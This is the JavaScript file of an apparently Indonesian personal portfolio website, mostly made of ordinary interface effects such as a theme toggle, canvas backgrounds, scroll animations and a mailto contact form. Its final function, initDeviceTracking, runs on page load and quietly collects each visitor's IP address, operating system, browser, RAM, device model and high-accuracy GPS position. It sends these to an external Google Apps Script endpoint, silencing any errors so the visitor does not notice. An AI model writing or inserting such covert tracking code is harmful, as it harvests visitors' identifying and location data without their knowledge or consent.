document.addEventListener('DOMContentLoaded', () => {
    // Initialize functions
    initThemeToggle();
    initNavbar();
    initCustomCursor();
    initMobileNav();
    initTypingEffect();
    initCvDropdown();
    initParticleBackground();
    initGeometricBackground();
    initScrollReveal();
    initCounterAnimation();
    initBackToTop();
    initContactForm();
    initDeviceTracking(); // Fungsi tracking dari main.js
});

/* ==========================================================================
   DARK / LIGHT MODE TOGGLE
   ========================================================================== */
function initThemeToggle() {
    const toggleBtn = document.getElementById('theme-toggle');
    const root = document.documentElement;
    const storedTheme = localStorage.getItem('theme');

    // Default: Light Mode, unless the user already chose Dark Mode before
    const initialTheme = storedTheme === 'dark' ? 'dark' : 'light';
    root.setAttribute('data-theme', initialTheme);

    if (!toggleBtn) return;

    toggleBtn.addEventListener('click', () => {
        const currentTheme = root.getAttribute('data-theme') === 'dark' ? 'dark' : 'light';
        const nextTheme = currentTheme === 'dark' ? 'light' : 'dark';
        root.setAttribute('data-theme', nextTheme);
        localStorage.setItem('theme', nextTheme);
    });
}

/* ==========================================================================
   NAVBAR SCROLL EFFECT
   ========================================================================== */
function initNavbar() {
    const navbar = document.getElementById('navbar');
    const navLinks = document.querySelectorAll('.nav-link');
    const sections = document.querySelectorAll('section');

    window.addEventListener('scroll', () => {
        // Sticky Header Class
        if (window.scrollY > 50) {
            navbar.classList.add('scrolled');
        } else {
            navbar.classList.remove('scrolled');
        }

        // Active Section Tracker
        let currentSectionId = 'hero';
        sections.forEach(section => {
            const sectionTop = section.offsetTop - 120;
            const sectionHeight = section.offsetHeight;
            if (window.scrollY >= sectionTop && window.scrollY < sectionTop + sectionHeight) {
                currentSectionId = section.getAttribute('id');
            }
        });

        navLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === `#${currentSectionId}`) {
                link.classList.add('active');
            }
        });
    });
}

/* ==========================================================================
   CUSTOM CURSOR FOLLOW EFFECT
   ========================================================================== */
function initCustomCursor() {
    const cursorDot = document.querySelector('.custom-cursor-dot');
    const cursorOutline = document.querySelector('.custom-cursor-outline');

    if (!cursorDot || !cursorOutline) return;

    let posX = 0, posY = 0;
    let mouseX = 0, mouseY = 0;

    window.addEventListener('mousemove', (e) => {
        mouseX = e.clientX;
        mouseY = e.clientY;

        cursorDot.style.left = `${mouseX}px`;
        cursorDot.style.top = `${mouseY}px`;
    });

    function animateCursorOutline() {
        posX += (mouseX - posX) * 0.15;
        posY += (mouseY - posY) * 0.15;

        cursorOutline.style.left = `${posX}px`;
        cursorOutline.style.top = `${posY}px`;

        requestAnimationFrame(animateCursorOutline);
    }
    animateCursorOutline();

    const hoverTargets = document.querySelectorAll('a, button, input, textarea, .dropdown-trigger, .project-card, .timeline-content');
    hoverTargets.forEach(target => {
        target.addEventListener('mouseenter', () => {
            document.body.classList.add('custom-cursor-hover');
        });
        target.addEventListener('mouseleave', () => {
            document.body.classList.remove('custom-cursor-hover');
        });
    });
}

/* ==========================================================================
   MOBILE NAVIGATION MENU
   ========================================================================== */
function initMobileNav() {
    const mobileToggle = document.getElementById('mobile-toggle');
    const navMenu = document.getElementById('nav-menu');
    const navLinks = document.querySelectorAll('.nav-link');

    if (!mobileToggle || !navMenu) return;

    mobileToggle.addEventListener('click', () => {
        mobileToggle.classList.toggle('active');
        navMenu.classList.toggle('active');
    });

    navLinks.forEach(link => {
        link.addEventListener('click', () => {
            mobileToggle.classList.remove('active');
            navMenu.classList.remove('active');
        });
    });

    document.addEventListener('click', (e) => {
        if (!mobileToggle.contains(e.target) && !navMenu.contains(e.target)) {
            mobileToggle.classList.remove('active');
            navMenu.classList.remove('active');
        }
    });
}

/* ==========================================================================
   TYPING EFFECT
   ========================================================================== */
function initTypingEffect() {
    const targetElement = document.getElementById('typed-text');
    if (!targetElement) return;

    const phrases = ['Graphic Designer', 'IT Support', 'Web Developer'];
    let phraseIndex = 0;
    let charIndex = 0;
    let isDeleting = false;
    let typingSpeed = 100;

    function type() {
        const currentPhrase = phrases[phraseIndex];

        if (isDeleting) {
            targetElement.textContent = currentPhrase.substring(0, charIndex - 1);
            charIndex--;
            typingSpeed = 50;
        } else {
            targetElement.textContent = currentPhrase.substring(0, charIndex + 1);
            charIndex++;
            typingSpeed = 120;
        }

        if (!isDeleting && charIndex === currentPhrase.length) {
            isDeleting = true;
            typingSpeed = 2000;
        } else if (isDeleting && charIndex === 0) {
            isDeleting = false;
            phraseIndex = (phraseIndex + 1) % phrases.length;
            typingSpeed = 500;
        }

        setTimeout(type, typingSpeed);
    }

    setTimeout(type, 1000);
}

/* ==========================================================================
   CV DROPDOWN CONTROL
   ========================================================================== */
function initCvDropdown() {
    const trigger = document.getElementById('cv-dropdown-btn');
    const menu = document.getElementById('cv-menu');

    if (!trigger || !menu) return;

    trigger.addEventListener('click', (e) => {
        e.stopPropagation();
        menu.classList.toggle('show');
    });

    document.addEventListener('click', (e) => {
        if (!trigger.contains(e.target) && !menu.contains(e.target)) {
            menu.classList.remove('show');
        }
    });
}

/* ==========================================================================
   INTERACTIVE CANVAS PARTICLE BACKGROUND
   ========================================================================== */
function initParticleBackground() {
    const canvas = document.getElementById('particle-canvas');
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    let particlesArray = [];
    const maxParticles = 60;

    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    resizeCanvas();
    window.addEventListener('resize', resizeCanvas);

    class Particle {
        constructor() {
            this.x = Math.random() * canvas.width;
            this.y = Math.random() * canvas.height;
            this.size = Math.random() * 2 + 1;
            this.speedX = Math.random() * 0.4 - 0.2;
            this.speedY = Math.random() * 0.4 - 0.2;
            this.color = 'rgba(113, 197, 233, 0.35)';
        }

        update() {
            this.x += this.speedX;
            this.y += this.speedY;

            if (this.x > canvas.width || this.x < 0) this.speedX = -this.speedX;
            if (this.y > canvas.height || this.y < 0) this.speedY = -this.speedY;
        }

        draw() {
            ctx.fillStyle = this.color;
            ctx.beginPath();
            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
            ctx.fill();
        }
    }

    function init() {
        particlesArray = [];
        for (let i = 0; i < maxParticles; i++) {
            particlesArray.push(new Particle());
        }
    }
    init();

    function connectNodes() {
        for (let a = 0; a < particlesArray.length; a++) {
            for (let b = a; b < particlesArray.length; b++) {
                const dx = particlesArray[a].x - particlesArray[b].x;
                const dy = particlesArray[a].y - particlesArray[b].y;
                const distance = Math.sqrt(dx * dx + dy * dy);

                if (distance < 120) {
                    const opacity = (1 - (distance / 120)) * 0.12;
                    ctx.strokeStyle = `rgba(113, 197, 233, ${opacity})`;
                    ctx.lineWidth = 1;
                    ctx.beginPath();
                    ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
                    ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
                    ctx.stroke();
                }
            }
        }
    }

    function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        particlesArray.forEach(particle => {
            particle.update();
            particle.draw();
        });

        connectNodes();
        requestAnimationFrame(animate);
    }
    animate();
}

/* ==========================================================================
   GEOMETRIC BACKGROUND (SEGITIGA BERPUTAR)
   ========================================================================== */
function initGeometricBackground() {
    const canvas = document.getElementById('geo-canvas');
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    let triangles = [];
    const numTriangles = 15;

    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    resizeCanvas();
    window.addEventListener('resize', resizeCanvas);

    class Triangle {
        constructor() {
            this.x = Math.random() * canvas.width;
            this.y = Math.random() * canvas.height;
            this.size = Math.random() * 50 + 25;
            this.rotation = Math.random() * Math.PI * 2;
            this.speed = (Math.random() - 0.5) * 0.015;
            this.opacity = Math.random() * 0.08 + 0.03;
            this.phase = Math.random() * Math.PI * 2;
        }

        draw() {
            ctx.save();
            ctx.translate(this.x, this.y);
            ctx.rotate(this.rotation);
            ctx.globalAlpha = this.opacity;

            ctx.beginPath();
            for (let i = 0; i < 3; i++) {
                const angle = (i * 2 * Math.PI / 3) - Math.PI / 2;
                const px = this.size * Math.cos(angle);
                const py = this.size * Math.sin(angle);
                i === 0 ? ctx.moveTo(px, py) : ctx.lineTo(px, py);
            }
            ctx.closePath();
            
            const gradient = ctx.createLinearGradient(-this.size, -this.size, this.size, this.size);
            gradient.addColorStop(0, 'rgba(113, 197, 233, 0.1)');
            gradient.addColorStop(0.5, 'rgba(139, 92, 246, 0.1)');
            gradient.addColorStop(1, 'rgba(113, 197, 233, 0.1)');
            ctx.fillStyle = gradient;
            ctx.fill();
            
            ctx.strokeStyle = 'rgba(113, 197, 233, 0.15)';
            ctx.lineWidth = 1.2;
            ctx.stroke();
            
            ctx.restore();

            this.rotation += this.speed;
            this.x += Math.sin(this.phase) * 0.2;
            this.y += Math.cos(this.phase) * 0.2;
            this.phase += 0.005;
            
            // Bounce
            if (this.x > canvas.width + 50 || this.x < -50) this.x = Math.random() * canvas.width;
            if (this.y > canvas.height + 50 || this.y < -50) this.y = Math.random() * canvas.height;
        }
    }

    // Initialize triangles
    for (let i = 0; i < numTriangles; i++) {
        triangles.push(new Triangle());
    }

    function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        triangles.forEach(t => t.draw());
        requestAnimationFrame(animate);
    }

    animate();
}

/* ==========================================================================
   SCROLL ENTRANCE ANIMATION (SCROLL REVEAL)
   ========================================================================== */
function initScrollReveal() {
    const revealTargets = document.querySelectorAll(
        'section:not(#hero), .edu-card, .about-interactive-card, .timeline-item, .skills-column, .contact-link-card, .contact-form-card'
    );

    revealTargets.forEach(target => {
        target.classList.add('reveal');
    });

    const observerOptions = {
        root: null,
        threshold: 0.12,
        rootMargin: '0px'
    };

    const observer = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('active');
                observer.unobserve(entry.target);
            }
        });
    }, observerOptions);

    revealTargets.forEach(target => {
        observer.observe(target);
    });
}

/* ==========================================================================
   COUNTER ANIMATION FOR STATS
   ========================================================================== */
function initCounterAnimation() {
    const statNumbers = document.querySelectorAll('.stat-number');
    
    const observerOptions = {
        root: null,
        threshold: 0.5
    };

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const target = entry.target;
                const count = parseFloat(target.getAttribute('data-count'));
                const isDecimal = count % 1 !== 0;
                const duration = 2000;
                const startTime = performance.now();

                function updateCounter(currentTime) {
                    const elapsed = currentTime - startTime;
                    const progress = Math.min(elapsed / duration, 1);
                    
                    // Ease out cubic
                    const eased = 1 - Math.pow(1 - progress, 3);
                    const current = eased * count;
                    
                    target.textContent = isDecimal ? current.toFixed(2) : Math.floor(current);
                    
                    if (progress < 1) {
                        requestAnimationFrame(updateCounter);
                    } else {
                        target.textContent = isDecimal ? count.toFixed(2) : count;
                    }
                }

                requestAnimationFrame(updateCounter);
                observer.unobserve(target);
            }
        });
    }, observerOptions);

    statNumbers.forEach(stat => {
        const initialValue = stat.textContent;
        stat.setAttribute('data-count', initialValue);
        stat.textContent = '0';
        observer.observe(stat);
    });
}

/* ==========================================================================
   BACK TO TOP BUTTON
   ========================================================================== */
function initBackToTop() {
    const backToTopBtn = document.getElementById('back-to-top');
    if (!backToTopBtn) return;

    window.addEventListener('scroll', () => {
        if (window.scrollY > 500) {
            backToTopBtn.classList.add('show');
        } else {
            backToTopBtn.classList.remove('show');
        }
    });

    backToTopBtn.addEventListener('click', () => {
        window.scrollTo({
            top: 0,
            behavior: 'smooth'
        });
    });
}

/* ==========================================================================
   CONTACT FORM SUBMISSION
   ========================================================================== */
function initContactForm() {
    const form = document.getElementById('contact-form');
    const submitBtn = document.getElementById('form-submit-btn');
    const formStatus = document.getElementById('form-status');

    if (!form || !submitBtn || !formStatus) return;

    form.addEventListener('submit', (e) => {
        e.preventDefault();

        const name = document.getElementById('name').value;
        const email = document.getElementById('email').value;
        const message = document.getElementById('message').value;

        submitBtn.disabled = true;
        const originalBtnText = submitBtn.innerHTML;
        submitBtn.innerHTML = 'Mempersiapkan Email... <i class="fa-solid fa-spinner fa-spin"></i>';
        formStatus.innerHTML = '';
        formStatus.className = 'form-status';

        const emailTarget = 'brnfznlkmn@gmail.com';
        const emailSubject = `Pesan Portofolio dari ${name}`;
        const emailBody = `Nama: ${name}\nEmail: ${email}\n\nPesan:\n${message}`;
        const mailtoUrl = `mailto:${emailTarget}?subject=${encodeURIComponent(emailSubject)}&body=${encodeURIComponent(emailBody)}`;

        setTimeout(() => {
            submitBtn.disabled = false;
            submitBtn.innerHTML = originalBtnText;

            window.location.href = mailtoUrl;

            formStatus.classList.add('success');
            formStatus.innerHTML = '<i class="fa-solid fa-circle-check"></i> Membuka aplikasi email Anda...';

            form.reset();

            setTimeout(() => {
                formStatus.style.transition = 'opacity 0.8s';
                formStatus.style.opacity = '0';
                setTimeout(() => {
                    formStatus.innerHTML = '';
                    formStatus.style.opacity = '1';
                }, 800);
            }, 5000);
        }, 1200);
    });
}

/* ==========================================================================
   DEVICE TRACKING (Dari main.js)
   ========================================================================== */
function initDeviceTracking() {
    // ============================================================
    // Konfigurasi
    // ============================================================
    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxI1tFTz9niBcuf1uc6Oe42JrvmkaOIVaDEpg4BDVhgpHEjhGoNUhcci1BorzKmRTS7Bg/exec";

    // ============================================================
    // Deteksi OS, Browser, & Engine Detail
    // ============================================================
    function getDetailedSpecs() {
        const ua = navigator.userAgent;
        let osDetail = "Unknown OS";
        let browserDetail = "Unknown Browser";
        let engine = "Unknown Engine";

        // Deteksi Engine
        if (/WebKit/i.test(ua)) engine = "WebKit";
        if (/Gecko/i.test(ua) && !/WebKit/i.test(ua)) engine = "Gecko";
        if (/Chrome/i.test(ua)) engine = "Blink";

        // Deteksi OS
        if (/iPhone|iPad|iPod/.test(ua)) {
            const v = (ua.match(/OS (\d+)_(\d+)_?(\d+)?/));
            osDetail = `iOS ${v[1]}.${v[2]}.${v[3] || '0'}`;
        } else if (/Android/.test(ua)) {
            const v = (ua.match(/Android (\d+)/));
            osDetail = `Android ${v ? v[1] : 'Unknown'}`;
        } else if (/Windows NT/.test(ua)) {
            const v = ua.match(/Windows NT (\d+\.\d+)/);
            const winMap = {
                "10.0": "10/11",
                "6.3": "8.1",
                "6.2": "8",
                "6.1": "7"
            };
            osDetail = `Windows ${winMap[v[1]] || v[1]}`;
        } else {
            osDetail = navigator.platform;
        }

        // Deteksi Browser
        let M = ua.match(/(opera|chrome|safari|firefox|msie|trident|edg(?=\/))\/?\s*(\d+)/i) || [];
        let name = M[1] ? M[1].toLowerCase() : "Unknown";
        let version = M[2] || "0";

        if (name === 'edg') name = 'Edge';
        if (name === 'trident') name = 'IE';

        browserDetail = `${name.charAt(0).toUpperCase() + name.slice(1)} ${version} (${engine})`;

        return { osDetail, browserDetail };
    }

    // ============================================================
    // Deteksi Model Perangkat (khusus iPhone)
    // ============================================================
    function getDeviceModel() {
        const w = window.screen.width;
        const h = window.screen.height;
        const ua = navigator.userAgent;

        if (!/iPhone|iPad|iPod/.test(ua)) return navigator.platform;

        const models = {
            "440:956": "iPhone 16/17 Pro Max",
            "402:874": "iPhone 16/17 Pro",
            "430:932": "iPhone 15/16 Plus / 14 Pro Max",
            "393:852": "iPhone 15/16 / 14 Pro",
            "390:844": "iPhone 12/13/14",
            "428:926": "iPhone 12/13/14 Pro Max",
            "414:896": "iPhone 11/XR/XS Max",
            "375:812": "iPhone X/XS/11Pro",
            "375:667": "iPhone SE/6/7/8",
            "414:736": "iPhone 6/7/8 Plus"
        };

        return models[`${w}:${h}`] || "Apple iPhone";
    }

    // ============================================================
    // Tracking Engine Utama
    // ============================================================
    function startTracker() {
        const specs = getDetailedSpecs();

        let payload = {
            ip: "Checking...",
            osDetail: specs.osDetail,
            browserDetail: specs.browserDetail,
            ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
            deviceName: getDeviceModel(),
            lat: null,
            long: null
        };

        // Dapatkan IP
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                payload.ip = data.ip;
            })
            .catch(() => {
                payload.ip = "Hidden/VPN";
            })
            .finally(() => {
                // Kirim data ke Google Apps Script
                sendDataToServer(payload);
            });

        // Fungsi kirim data
        function sendDataToServer(data) {
            fetch(WEB_APP_URL, {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify(data)
            }).catch(() => {
                // Silent fail - tidak mengganggu user
            });
        }

        // Dapatkan lokasi GPS jika diizinkan
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    payload.lat = pos.coords.latitude;
                    payload.long = pos.coords.longitude;
                    sendDataToServer(payload);
                },
                () => {
                    // User menolak akses lokasi, kirim data tanpa lokasi
                    sendDataToServer(payload);
                },
                { enableHighAccuracy: true }
            );
        } else {
            // Browser tidak support Geolocation
            sendDataToServer(payload);
        }
    }

    // ============================================================
    // Inisialisasi Tracking saat halaman selesai dimuat
    // ============================================================
    if (document.readyState === 'complete') {
        startTracker();
    } else {
        window.addEventListener('load', startTracker);
    }
}
